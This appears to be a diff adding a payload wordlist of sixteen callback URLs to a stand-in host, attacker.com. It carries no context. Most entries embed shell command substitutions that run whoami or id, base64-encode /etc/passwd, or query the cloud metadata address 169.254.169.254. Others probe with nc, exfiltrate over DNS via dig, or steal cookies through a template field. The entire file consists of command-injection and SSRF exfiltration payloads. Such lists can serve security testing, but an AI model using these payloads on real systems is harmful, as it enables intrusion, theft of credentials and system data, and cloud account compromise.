@@ -1,0 +1,16 @@
+http://attacker.com/callback
+http://attacker.com/$(whoami)
+http://attacker.com/$(cat /etc/passwd | base64)
+http://attacker.com/`whoami`
+http://attacker.com/$(hostname)
+http://attacker.com/$(id)
+http://attacker.com/$(pwd)
+http://attacker.com:8080/callback
+https://attacker.com/callback
+http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
+http://attacker.com/steal?cookie={{cookie}}
+http://attacker.com/ssrf?ip=$(hostname -I)
+http://attacker.com/$(wget -q -O- http://169.254.169.254/latest/meta-data/ | base64)
+http://attacker.com/$(curl -s http://localhost:8080/api/status | base64)
+http://attacker.com/$(nc -zv 169.254.169.254 80 2>&1 | base64)
+http://attacker.com/$(dig -t TXT $(hostname).attacker.com)
